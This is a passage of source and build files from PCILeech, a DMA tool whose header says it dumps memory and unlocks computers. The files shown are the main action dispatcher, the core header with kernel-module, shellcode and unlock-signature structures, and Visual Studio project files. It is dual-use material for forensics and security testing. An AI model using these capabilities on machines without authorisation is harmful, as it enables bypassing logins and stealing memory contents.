        LcGetOption(ctxMain->hLC, LC_OPT_CORE_ADDR_MAX, &ctxMain->cfg.paAddrMax);
    }
    // enable ctrl+c event handler if remote (to circumvent blocking thread)
	PCILeechCtrlHandlerInitialize();
    // main dispatcher
    switch(ctxMain->cfg.tpAction) {
        case DUMP:
            ActionMemoryDump();
            break;
        case WRITE:
            ActionMemoryWrite();
            break;
        case DISPLAY:
            if(ctxMain->cfg.dwPID) {
                ActionMemoryDisplayVirtual();
            } else {
                ActionMemoryDisplayPhysical();
            }
            break;
        case PAGEDISPLAY:
            ActionMemoryPageDisplay();
            break;
        case PATCH:
        case SEARCH:
            if(ctxMain->cfg.dwPID) {
                ActionPatchAndSearchVirtual();
            } else {
                ActionPatchAndSearchPhysical();
            }
            break;
        case EXEC_KMD:
            ActionExecShellcode();
            break;
        case EXEC_UMD:
            ActionExecUserMode();
            break;
        case TESTMEMREAD:
        case TESTMEMREADWRITE:
            ActionMemoryTestReadWrite();
            break;
        case MAC_FVRECOVER:
            Action_MacFilevaultRecover(TRUE);
            break;
        case PT_PHYS2VIRT:
            Action_PT_Phys2Virt();
            break;
        case PT_VIRT2PHYS:
            Action_PT_Virt2Phys();
            break;
        case TLP:
            Action_TlpTx();
            break;
        case TLPLOOP:
            Action_TlpTxLoop();
            break;
        case PROBE:
            ActionMemoryProbe();
            break;
        case REGCFG:
            Action_RegCfgReadWrite();
            break;
        case MOUNT:
            ActionMount();
            break;
        case PSLIST:
            Action_UmdPsList();
            break;
        case PSVIRT2PHYS:
            Action_UmdPsVirt2Phys();
            break;
        case AGENT_EXEC_PY:
            ActionAgentExecPy();
            break;
        case AGENT_FORENSIC:
            ActionAgentForensic();
            break;
        case KMDLOAD:
            if(ctxMain->cfg.paKMD) {
                printf("KMD: Successfully loaded at address: 0x%08x\n", (DWORD)ctxMain->cfg.paKMD);
            } else {
                printf("KMD: Failed. Please supply valid -kmd and optionally -cr3 parameters.\n");
            }
            break;
        case KMDEXIT:
            KMDUnload();
            printf("KMD: Hopefully unloaded.\n");
            break;
        case EXTERNAL_COMMAND_MODULE:
            if((hExternalCommandModule = LoadLibraryA(ctxMain->cfg.szExternalCommandModule))) {
                if((pfnExternalCommandModuleDoAction = (VOID(*)(PPCILEECH_CONTEXT))GetProcAddress(hExternalCommandModule, "DoAction"))) {
                    pfnExternalCommandModuleDoAction(ctxMain);
                } else {
                    printf("Failed. External command module '%s' could not locate required DoAction function.\n", ctxMain->cfg.szExternalCommandModule);
                }
                FreeLibrary(hExternalCommandModule);
            } else {
                printf("Failed. External command module '%s' could not be loaded.\n", ctxMain->cfg.szExternalCommandModule);
            }
            break;
        default:
            printf("Failed. Not yet implemented.\n");
            break;
    }
    if(ctxMain && ctxMain->phKMD && (ctxMain->cfg.tpAction != KMDLOAD) && !ctxMain->cfg.fAddrKMDSetByArgument) {
        KMDUnload();
        printf("KMD: Hopefully unloaded.\n");
    }
    if(ctxMain && ctxMain->cfg.dwListenTlpTimeMs) {
        LcCommand(ctxMain->hLC, LC_CMD_FPGA_LISTEN_TLP, sizeof(DWORD), (PBYTE)&ctxMain->cfg.dwListenTlpTimeMs, NULL, NULL);
    }
    PCILeechFreeContext();
#ifdef LINUX
    ExitProcess(0);
#else /* LINUX */
    __try {
        ExitProcess(0);
    } __except(EXCEPTION_EXECUTE_HANDLER) { ; }
#endif /* LINUX */
    return 0;
}

```

`pcileech/pcileech.h`:

```h
// pcileech.h : definitions for pcileech - dump memory and unlock computers with a USB3380 device using DMA.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
// Header Version: 4.14
//
#ifndef __PCILEECH_H__
#define __PCILEECH_H__
#include <leechcore.h>

#ifdef _WIN32
typedef unsigned __int64                    QWORD, *PQWORD;
#endif /* _WIN32 */
#ifdef LINUX
#define WINAPI
typedef uint16_t                            WORD, *PWORD, USHORT, *PUSHORT;
typedef long long unsigned int              QWORD, *PQWORD, ULONG64, *PULONG64;
#endif /* LINUX */

#define SIZE_PAGE_ALIGN_4K(x)                ((x + 0xfff) & ~0xfff)
#define CONFIG_MAX_SIGNATURES                16
#define PCILEECH_DEVICE_EQUALS(name)         (0 == _stricmp(ctxMain->dev.szDeviceName, name))

#pragma pack(push, 1) /* DISABLE STRUCT PADDINGS (REENABLE AFTER STRUCT DEFINITIONS) */
typedef struct tdSignaturePTE {
    WORD cPages;
    WORD wSignature;
} SIGNATUREPTE, *PSIGNATUREPTE;
#pragma pack(pop) /* RE-ENABLE STRUCT PADDINGS */

typedef struct tdPCILEECH_CONTEXT        PCILEECH_CONTEXT, *PPCILEECH_CONTEXT;

typedef enum tdActionType {
    NA,
    INFO,
    DUMP,
    WRITE,
    PATCH,
    SEARCH,
    DISPLAY,
    PAGEDISPLAY,
    TESTMEMREAD,
    TESTMEMREADWRITE,
    KMDLOAD,
    KMDEXIT,
    EXEC_KMD,
    EXEC_UMD,
    MOUNT,
    MAC_FVRECOVER,
    MAC_FVRECOVER2,
    MAC_DISABLE_VTD,
    PT_PHYS2VIRT,
    PT_VIRT2PHYS,
    TLP,
    TLPLOOP,
    PROBE,
    REGCFG,
    PSLIST,
    PSVIRT2PHYS,
    AGENT_EXEC_PY,
    AGENT_FORENSIC,
    EXTERNAL_COMMAND_MODULE
} ACTION_TYPE;

typedef struct tdCONFIG_OPTION {
    QWORD isValid;
    QWORD qwValue;
} CONFIG_OPTION;

typedef struct tdConfig {
    QWORD paAddrMin;
    QWORD paAddrMax;
    QWORD paCR3;
    QWORD paEFI_IBI_SYST;
    QWORD paKMD;
    CHAR szDevice[MAX_PATH];
    CHAR szRemote[MAX_PATH];
    CHAR szMemMap[MAX_PATH];
    CHAR szMemMapStr[2048];
    CHAR szFileOut[MAX_PATH];
    PBYTE pbIn;
    QWORD cbIn;
    CHAR szInS[MAX_PATH];
    CHAR szMount[MAX_PATH];
    QWORD qwDataIn[10];
    ACTION_TYPE tpAction;
    CHAR szSignatureName[MAX_PATH];
    CHAR szKMDName[MAX_PATH];
    CHAR szShellcodeName[MAX_PATH];
    CHAR szHook[MAX_PATH];
    DWORD dwListenTlpTimeMs;
    CHAR szExternalCommandModule[MAX_PATH];
    // virtual address options
    DWORD dwPID;
    QWORD vaAddrMin;
    QWORD vaAddrMax;
    // flags below
    BOOL fPageTableScan;
    BOOL fPatchAll;
    BOOL fForceRW;
    BOOL fShowHelp;
    BOOL fOutFile;
    BOOL fVerbose;
    BOOL fVerboseExtra;
    BOOL fVerboseExtraTlp;
    BOOL fDebug;
    BOOL fPartialPageReadSupported;
    BOOL fAddrKMDSetByArgument;
    BOOL fLoop;
    BOOL fUserInteract;
} CONFIG, *PCONFIG;

#define SIGNATURE_CHUNK_TP_OFFSET_FIXED     0
#define SIGNATURE_CHUNK_TP_OFFSET_RELATIVE  1
#define SIGNATURE_CHUNK_TP_OFFSET_ANY       2
typedef struct tdSignatureChunk {
    QWORD qwAddress;
    DWORD cbOffset;
    DWORD cb;
    BYTE tpOffset;
    BYTE pb[4096];
} SIGNATURE_CHUNK, *PSIGNATURE_CHUNK;

typedef struct tdSignature {
    // in unlock mode:
    //   chunk[0] = signature chunk 1 (required)
    //   chunk[1] = signature chunk 2 (optional)
    //   chunk[2] = patch chunk (required)
    //   chunk[3..5] = (not used)
    // in kmd mode:
    //   chunk[0] = signature 1/page 1/SHA256(page1) (required)
    //   chunk[1] = signature 2/page 2/SHA256(page2) (required)
    //   chunk[2] = shellcode 1
    //   chunk[3] = shellcode 2
    //   chunk[4] = shellcode 3
    //   chunk[5] = PTE signature (only needed in PTE mode)
    SIGNATURE_CHUNK chunk[6];
} SIGNATURE, *PSIGNATURE;

#define KMDEXEC_MAGIC 0x3cec1337
#pragma pack(push, 1) /* DISABLE STRUCT PADDINGS (REENABLE AFTER STRUCT DEFINITIONS) */
typedef struct tdKmdExec {
    DWORD dwMagic;
    BYTE pbChecksumSHA256[32];
    QWORD qwVersion;
    union {
        LPSTR szOutFormatPrintf;
        QWORD _Filler2;
    };
    QWORD cbShellcode;
    union {
        PBYTE pbShellcode;
        QWORD _Filler3;
    };
    QWORD _Filler4[4];
} KMDEXEC, *PKMDEXEC;
#pragma pack(pop) /* RE-ENABLE STRUCT PADDINGS */

#define KMDDATA_OPERATING_SYSTEM_WINDOWS    0x01
#define KMDDATA_OPERATING_SYSTEM_LINUX      0x02
#define KMDDATA_OPERATING_SYSTEM_MACOS      0x04
#define KMDDATA_OPERATING_SYSTEM_FREEBSD    0x08
#define KMDDATA_OPERATING_SYSTEM_UEFI       0x10

#define KMDDATA_MAGIC                       0xff11337711333377
#define KMDDATA_MAGIC_PARTIAL               0xff11337711333388

#define KMD_CMD_VOID                        0xffff
#define KMD_CMD_COMPLETED                   0
#define KMD_CMD_READ                        1
#define KMD_CMD_WRITE                       2
#define KMD_CMD_TERMINATE                   3
#define KMD_CMD_MEM_INFO                    4
#define KMD_CMD_EXEC                        5
#define KMD_CMD_READ_VA                     6
#define KMD_CMD_WRITE_VA                    7
#define KMD_CMD_EXEC_EXTENDED               8

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 003
*/
typedef struct tdKMDDATA {
    QWORD MAGIC;                    // [0x000] magic number 0x0ff11337711333377.
    QWORD AddrKernelBase;           // [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
    QWORD AddrKallsymsLookupName;   // [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
    QWORD DMASizeBuffer;            // [0x018] size of DMA buffer.
    QWORD DMAAddrPhysical;          // [0x020] physical address of DMA buffer.
    QWORD DMAAddrVirtual;           // [0x028] virtual address of DMA buffer.
    QWORD _status;                  // [0x030] status of operation
    QWORD _result;                  // [0x038] result of operation TRUE|FALSE
    QWORD _address;                 // [0x040] address to operate on.
    QWORD _size;                    // [0x048] size of operation / data in DMA buffer.
    QWORD OperatingSystem;          // [0x050] operating system type
    QWORD ReservedKMD[8];           // [0x058] reserved for specific kmd data (dependant on KMD version).
    QWORD ReservedFutureUse1[13];   // [0x098] reserved for future use.
    QWORD dataInExtraLength;        // [0x100] length of extra in-data.
    QWORD dataInExtraOffset;        // [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
    QWORD dataInExtraLengthMax;     // [0x110] maximum length of extra in-data.
    QWORD dataInConsoleBuffer;      // [0x118] physical address of 1-page console buffer.
    QWORD dataIn[28];               // [0x120]
    QWORD dataOutExtraLength;       // [0x200] length of extra out-data.
    QWORD dataOutExtraOffset;       // [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
    QWORD dataOutExtraLengthMax;    // [0x210] maximum length of extra out-data.
    QWORD dataOutConsoleBuffer;     // [0x218] physical address of 1-page console buffer.
    QWORD dataOut[28];              // [0x220]
    QWORD fn[32];                   // [0x300] used by shellcode to store function pointers.
    CHAR dataInStr[MAX_PATH];       // [0x400] string in-data
    CHAR ReservedFutureUse2[252];
    CHAR dataOutStr[MAX_PATH];      // [0x600] string out-data
    CHAR ReservedFutureUse3[252];
    QWORD ReservedFutureUse4[255];  // [0x800]
    QWORD _op;                      // [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

typedef struct _PHYSICAL_MEMORY_RANGE {
    QWORD BaseAddress;
    QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

typedef struct tdKMDHANDLE {
    DWORD dwPageAddr32;
    QWORD cPhysicalMap;
    PPHYSICAL_MEMORY_RANGE pPhysicalMap;
    PKMDDATA pk;
    BYTE pbPageData[4096];
} KMDHANDLE, *PKMDHANDLE;

typedef struct tdVFS_CONTEXT {
    BOOL fInitialized;
    WCHAR wchMountPoint;
    BOOL(WINAPI *pfnDokanUnmount)(WCHAR DriveLetter);
} VFS_CONTEXT, *PVFS_CONTEXT;

#define PCILEECH_CONTEXT_MAGIC              0xfeefd00d
#define PCILEECH_CONTEXT_VERSION                  0x45

/*
* The main PCILeech context as found in the ctxMain global variable.
* Any external command module using this struct or any of its sub-
* structs must check the fields magic and version against the defines
* PCILEECH_CONTEXT_MAGIC and PCILEECH_CONTEXT_VERSION to determine
* compatibility before taking any actions on the struct.
*/
struct tdPCILEECH_CONTEXT {
    DWORD magic;
    DWORD version;
    CONFIG cfg;
    HANDLE hLC;
    LC_CONFIG dev;
    BOOL fVmmInitialized;
    HANDLE hDevice;
    PKMDHANDLE phKMD;
    PKMDDATA pk;
    VFS_CONTEXT vfs;
    DWORD argc;
    char** argv;
};

BOOL PCILeechConfigIntialize(_In_ DWORD argc, _In_ char* argv[]);
VOID PCILeechConfigFixup();
VOID PCILeechFreeContext();

// ----------------------------------------------------------------------------
// PCILeech global variables below:
// ----------------------------------------------------------------------------

extern PPCILEECH_CONTEXT ctxMain;

#endif /* __PCILEECH_H__ */

```

`pcileech/pcileech.rc`:

```rc
#include "version.h"
#include "winres.h"


/////////////////////////////////////////////////////////////////////////////
// Neutral (Default) (unknown sub-lang: 0x8) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ZZZ)
LANGUAGE LANG_NEUTRAL, 0x8

/////////////////////////////////////////////////////////////////////////////
//
// Version
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION VER_FILE_VERSION
 PRODUCTVERSION VER_PRODUCT_VERSION
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x40004L
 FILETYPE 0x1L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040004b0"
        BEGIN
            VALUE "CompanyName", VER_COMPANY_NAME_STR "\0"
            VALUE "FileDescription", VER_FILE_DESCRIPTION_STR "\0"
            VALUE "FileVersion", VER_FILE_VERSION_STR "\0"
            VALUE "InternalName", VER_INTERNAL_NAME_STR "\0"
            VALUE "LegalCopyright", VER_COPYRIGHT_STR "\0"
            VALUE "OriginalFilename", VER_ORIGINAL_FILENAME_STR "\0"
            VALUE "ProductName", VER_PRODUCTNAME_STR "\0"
            VALUE "ProductVersion", VER_PRODUCT_VERSION_STR "\0"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x400, 1200
    END
END

#endif    // Neutral (Default) (unknown sub-lang: 0x8) resources
/////////////////////////////////////////////////////////////////////////////


```

`pcileech/pcileech.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <ItemGroup>
    <None Include="Makefile" />
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="pcileech.rc" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\includes\dokan.h" />
    <ClInclude Include="..\includes\fileinfo.h" />
    <ClInclude Include="..\includes\leechcore.h" />
    <ClInclude Include="..\includes\public.h" />
    <ClInclude Include="..\includes\vmmdll.h" />
    <ClInclude Include="device.h" />
    <ClInclude Include="executor.h" />
    <ClInclude Include="extra.h" />
    <ClInclude Include="help.h" />
    <ClInclude Include="kmd.h" />
    <ClInclude Include="memdump.h" />
    <ClInclude Include="mempatch.h" />
    <ClInclude Include="ob\ob.h" />
    <ClInclude Include="oscompatibility.h" />
    <ClInclude Include="pcileech.h" />
    <ClInclude Include="shellcode.h" />
    <ClInclude Include="statistics.h" />
    <ClInclude Include="umd.h" />
    <ClInclude Include="util.h" />
    <ClInclude Include="version.h" />
    <ClInclude Include="vfs.h" />
    <ClInclude Include="vmmx.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="charutil.c" />
    <ClCompile Include="device.c" />
    <ClCompile Include="executor.c" />
    <ClCompile Include="extra.c" />
    <ClCompile Include="help.c" />
    <ClCompile Include="kmd.c" />
    <ClCompile Include="memdump.c" />
    <ClCompile Include="mempatch.c" />
    <ClCompile Include="ob\ob_cachemap.c" />
    <ClCompile Include="ob\ob_core.c" />
    <ClCompile Include="ob\ob_map.c" />
    <ClCompile Include="ob\ob_set.c" />
    <ClCompile Include="oscompatibility.c" />
    <ClCompile Include="pcileech.c" />
    <ClCompile Include="statistics.c" />
    <ClCompile Include="umd.c" />
    <ClCompile Include="util.c" />
    <ClCompile Include="vfs.c" />
    <ClCompile Include="vfslist.c" />
    <ClCompile Include="vmmx.c" />
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{DFFA1B4C-279B-4356-ADB1-08A6F4795931}</ProjectGuid>
    <RootNamespace>pcileech</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>false</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>false</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <OutDir>$(SolutionDir)\files\</OutDir>
    <IntDir>$(SolutionDir)\files\temp\$(ProjectName)\</IntDir>
    <IncludePath>$(VC_IncludePath);$(WindowsSDK_IncludePath);$(SolutionDir)includes;</IncludePath>
    <LibraryPath>$(VC_LibraryPath_x64);$(WindowsSDK_LibraryPath_x64);$(SolutionDir)includes\lib64;</LibraryPath>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <IncludePath>$(VC_IncludePath);$(WindowsSDK_IncludePath);$(SolutionDir)includes;</IncludePath>
    <LibraryPath>$(VC_LibraryPath_x86);$(WindowsSDK_LibraryPath_x86);$(SolutionDir)includes\lib32;</LibraryPath>
    <OutDir>$(SolutionDir)files\$(PlatformShortName)\</OutDir>
    <IntDir>$(SolutionDir)files\temp\$(ProjectName)\$(PlatformShortName)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <OutDir>$(SolutionDir)\files\</OutDir>
    <IntDir>$(SolutionDir)\files\temp\$(ProjectName)\</IntDir>
    <LinkIncremental>
    </LinkIncremental>
    <IncludePath>$(VC_IncludePath);$(WindowsSDK_IncludePath);$(SolutionDir)includes;</IncludePath>
    <LibraryPath>$(VC_LibraryPath_x64);$(WindowsSDK_LibraryPath_x64);$(SolutionDir)includes\lib64;</LibraryPath>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental />
    <IncludePath>$(VC_IncludePath);$(WindowsSDK_IncludePath);$(SolutionDir)includes;</IncludePath>
    <LibraryPath>$(VC_LibraryPath_x86);$(WindowsSDK_LibraryPath_x86);$(SolutionDir)includes\lib32;</LibraryPath>
    <OutDir>$(SolutionDir)files\$(PlatformShortName)\</OutDir>
    <IntDir>$(SolutionDir)files\temp\$(ProjectName)\$(PlatformShortName)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <AdditionalOptions>/D WIN32 %(AdditionalOptions)</AdditionalOptions>
      <CompileAs>CompileAsC</CompileAs>
    </ClCompile>
    <Link>
      <FullProgramDatabaseFile>
      </FullProgramDatabaseFile>
      <GenerateDebugInformation>Debug</GenerateDebugInformation>
      <AdditionalDependencies>leechcore.lib;vmm.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <ProgramDatabaseFile>$(OutDir)\lib\$(TargetName).pdb</ProgramDatabaseFile>
      <SubSystem>Console</SubSystem>
    </Link>
    <PreBuildEvent>
      <Command>
      </Command>
    </PreBuildEvent>
    <PostBuildEvent>
      <Command>
      </Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <AdditionalOptions>/D WIN32 %(AdditionalOptions)</AdditionalOptions>
      <CompileAs>CompileAsC</CompileAs>
    </ClCompile>
    <Link>
      <FullProgramDatabaseFile>
      </FullProgramDatabaseFile>
      <GenerateDebugInformation>Debug</GenerateDebugInformation>
      <AdditionalDependencies>leechcore.lib;vmm.lib;%(AdditionalDependencies)</AdditionalDependencies>
      <ProgramDatabaseFile>$(OutDir)\lib\$(TargetName).pdb</ProgramDatabaseFile>
      <SubSystem>Console</SubSystem>
    </Link>
    <PreBuildEvent>
      <Command>
      </Command>
    </PreBuildEvent>
    <PostBuildEvent>
      <Command>
      </Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>
      </SDLCheck>
      <AdditionalOptions>/D WIN32 %(AdditionalOptions)</AdditionalOptions>
      <CompileAs>CompileAsC</CompileAs>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <FullProgramDatabaseFile>
      </FullProgramDatabaseFile>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <ModuleDefinitionFile>
      </ModuleDefinitionFile>
      <SubSystem>Console</SubSystem>
      <ProgramDatabaseFile />
      <AdditionalDependencies>leechcore.lib;vmm.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
    <PreBuildEvent>
      <Command>
      </Command>
    </PreBuildEvent>
    <PostBuildEvent>
      <Command>
      </Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>
      </SDLCheck>
      <AdditionalOptions>/D WIN32 %(AdditionalOptions)</AdditionalOptions>
      <CompileAs>CompileAsC</CompileAs>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <FullProgramDatabaseFile>
      </FullProgramDatabaseFile>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <ModuleDefinitionFile>
      </ModuleDefinitionFile>
      <SubSystem>Console</SubSystem>
      <ProgramDatabaseFile>
      </ProgramDatabaseFile>
      <AdditionalDependencies>leechcore.lib;vmm.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
    <PreBuildEvent>
      <Command>
      </Command>
    </PreBuildEvent>
    <PostBuildEvent>
      <Command>
      </Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`pcileech/pcileech.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Header Files\includes">
      <UniqueIdentifier>{b5332eb1-5727-4efd-84e5-83cda653c431}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files\ob">
      <UniqueIdentifier>{95661a3c-2e91-40f9-8af4-abcf2f03eb52}</UniqueIdentifier>
    </Filter>
    <Filter Include="Header Files\ob">
      <UniqueIdentifier>{db37c203-79b1-4412-9064-840ab38c29fd}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <None Include="Makefile">
      <Filter>Resource Files</Filter>
    </None>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="pcileech.rc">
      <Filter>Resource Files</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="device.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="executor.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="extra.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="help.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="kmd.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="memdump.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="mempatch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="oscompatibility.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="pcileech.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="shellcode.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="statistics.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="umd.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="util.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="version.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="vfs.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\includes\dokan.h">
      <Filter>Header Files\includes</Filter>
    </ClInclude>
    <ClInclude Include="..\includes\fileinfo.h">
      <Filter>Header Files\includes</Filter>
    </ClInclude>
